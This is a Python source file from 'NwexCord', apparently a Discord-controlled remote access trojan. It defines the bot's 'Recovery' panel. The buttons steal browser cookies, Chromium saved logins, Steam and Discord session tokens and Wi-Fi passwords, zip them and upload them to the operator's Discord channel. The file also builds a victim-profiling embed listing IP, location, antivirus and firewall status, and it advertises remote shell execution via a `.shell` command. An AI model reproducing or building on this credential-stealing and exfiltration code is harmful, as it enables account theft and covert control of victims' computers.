"""
NwexCord Recovery Panel
Discord UI views and embeds for the recovery feature.
"""

import discord
import asyncio
import os
from datetime import datetime

from Tools.Recovery.recovery import build_recovery_zip


def _get_startup_view():
    from core.views import StartupView
    return StartupView


def embed_recovery_panel():
    """Create the Recovery panel embed."""
    embed = discord.Embed(
        title="🔓 NwexCord Recovery",
        description=(
            "Select a recovery task from the buttons below.\n\n"
            "🔄 **Run Recovery** — Grab all browser cookies + login data\n"
            "🎮 **Steam Token** — Extract Steam session tokens\n"
            "💬 **Discord Token** — Extract Discord tokens\n"
            "🌐 **Chromium** — Extract Chromium login data\n"
            "🍪 **Cookies** — Extract all browser cookies\n"
            "📶 **Wifi Keys** — Saved Wi-Fi passwords & network keys\n\n"
            "*Results are exported to `.txt` files inside a `.zip` archive.*"
        ),
        color=discord.Color.from_rgb(220, 50, 50)
    )
    embed.set_footer(text="NwexCord • Recovery Panel")
    return embed


class RecoveryResultView(discord.ui.View):
    """View shown after a recovery task finishes, with Back button."""
    def __init__(self):
        super().__init__(timeout=300)

    @discord.ui.button(label="Back to Recovery", emoji="⬅", style=discord.ButtonStyle.secondary)
    async def back_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.edit_message(
            content=None,
            embed=embed_recovery_panel(),
            attachments=[],
            view=RecoveryPanelView()
        )


async def _run_recovery_task(interaction: discord.Interaction, task_key: str, label: str):
    """Generic helper: run a recovery task, upload the zip."""
    loading_embed = discord.Embed(
        title=f"⏳ {label}",
        description="Extracting data, please wait...",
        color=discord.Color.greyple()
    )
    loading_embed.set_footer(text="NwexCord • Recovery")
    await interaction.response.edit_message(content=None, embed=loading_embed, view=None)

    loop = asyncio.get_event_loop()
    try:
        zip_path = await loop.run_in_executor(None, build_recovery_zip, [task_key])

        file_size = os.path.getsize(zip_path)
        if file_size > 25 * 1024 * 1024:
            embed = discord.Embed(
                title=f"❌ {label}",
                description="The archive exceeds Discord's 25 MB upload limit.",
                color=discord.Color.red()
            )
            embed.set_footer(text="NwexCord • Recovery")
            await interaction.edit_original_response(content=None, embed=embed, view=RecoveryResultView())
            return

        file = discord.File(zip_path, filename=os.path.basename(zip_path))

        embed = discord.Embed(
            title=f"✅ {label}",
            description=f"Recovery complete. Archive size: **{file_size / 1024:.1f} KB**",
            color=discord.Color.green(),
            timestamp=datetime.utcnow()
        )
        embed.set_footer(text="NwexCord • Recovery")
        await interaction.edit_original_response(
            content=None, embed=embed, attachments=[file], view=RecoveryResultView()
        )
    except Exception as e:
        embed = discord.Embed(
            title=f"❌ {label}",
            description=f"Error during recovery:\n```\n{e}\n```",
            color=discord.Color.red()
        )
        embed.set_footer(text="NwexCord • Recovery")
        await interaction.edit_original_response(content=None, embed=embed, view=RecoveryResultView())
    finally:
        try:
            os.remove(zip_path)
        except Exception:
            pass


class RecoveryPanelView(discord.ui.View):
    """The panel with all recovery tool buttons."""
    def __init__(self):
        super().__init__(timeout=300)

    # Row 0
    @discord.ui.button(label="Run Recovery", emoji="🔄", style=discord.ButtonStyle.danger, row=0)
    async def run_all_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await _run_recovery_task(interaction, "all", "🔄 Run Recovery (All Data)")

    @discord.ui.button(label="Steam Token", emoji="🎮", style=discord.ButtonStyle.secondary, row=0)
    async def steam_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await _run_recovery_task(interaction, "steam", "🎮 Steam Token")

    @discord.ui.button(label="Discord Token", emoji="💬", style=discord.ButtonStyle.secondary, row=0)
    async def discord_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await _run_recovery_task(interaction, "discord", "💬 Discord Token")

    # Row 1
    @discord.ui.button(label="Chromium", emoji="🌐", style=discord.ButtonStyle.secondary, row=1)
    async def chromium_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await _run_recovery_task(interaction, "chromium", "🌐 Chromium Login Data")

    @discord.ui.button(label="Cookies", emoji="🍪", style=discord.ButtonStyle.secondary, row=1)
    async def cookies_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await _run_recovery_task(interaction, "cookies", "🍪 Browser Cookies")

    @discord.ui.button(label="Wifi Keys", emoji="📶", style=discord.ButtonStyle.secondary, row=1)
    async def wifi_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await _run_recovery_task(interaction, "wifi", "📶 Wi-Fi Keys")

    # Row 2: Back
    @discord.ui.button(label="⬅ Back", style=discord.ButtonStyle.secondary, row=2)
    async def back_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        """Return to the startup info message."""
        await interaction.response.defer()
        from core.info import get_sys_info
        info = get_sys_info()
        left_col = (
            f"🌐 **IP** : {info.get('IP', 'Unknown')}\n"
            f"👤 **UserName** : {info['UserName']}\n"
            f"🖥️ **PCName** : {info['PCName']}\n"
            f"🪟 **OS** : {info['OS']}\n"
            f"📁 **Client** : {info['Client']}\n"
            f"⚙️ **Process** : {info['Process']}\n"
            f"📅 **DateTime** : {info['DateTime']}\n"
            f"🎇 **GPU** : {info['GPU']}\n"
            f"🧠 **CPU** : {info['CPU']}\n"
            f"🏷️ **Identifier** : {info['Identifier']}\n"
            f"📊 **Ram** : {info['Ram']}"
        )
        right_col = (
            f"📍 **Location** : {info.get('Location', 'Unknown')}\n"
            f"⏱️ **LastReboot** : {info['LastReboot']}\n"
            f"🛡️ **Antivirus** : {info['Antivirus']}\n"
            f"⚠️ **Firewall** : {info['Firewall']}\n"
            f"🌐 **MacAddress** : {info['MacAddress']}\n"
            f"🌍 **DefaultBrowser** : {info['DefaultBrowser']}\n"
            f"🗣️ **CurrentLang** : {info['CurrentLang']}\n"
            f"💻 **Platform** : {info['Platform']}\n"
            f"📋 **Ver** : {info['Ver']}\n"
            f"🔵 **.Net** : {info['.Net']}\n"
            f"🔋 **Battery** : {info['Battery']}"
        )
        embed = discord.Embed(title="[ Information ]", color=discord.Color.dark_theme())
        embed.add_field(name="\u200b", value=left_col, inline=True)
        embed.add_field(name="\u200b", value=right_col, inline=True)
        embed.set_footer(text=f"NwexCord • System Information • {datetime.now().strftime('Today at %#I:%M %p')}")
        msg_content = f"🚀 **NwexCord System Started!**\nUse `.shell <command>` to execute CMD/PowerShell commands on this machine."
        await interaction.edit_original_response(content=msg_content, embed=embed, view=_get_startup_view()())
